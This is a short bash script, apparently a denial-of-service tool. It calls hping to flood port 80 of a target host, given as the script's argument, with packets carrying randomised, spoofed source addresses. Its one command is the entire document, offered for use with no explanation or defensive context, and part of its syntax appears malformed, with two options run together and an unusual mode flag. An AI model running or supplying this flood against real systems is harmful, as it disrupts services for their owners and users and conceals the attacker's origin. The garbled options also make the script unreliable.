#!/bin/bash
hping -5 --flood -V --rand-source-p 80 $1
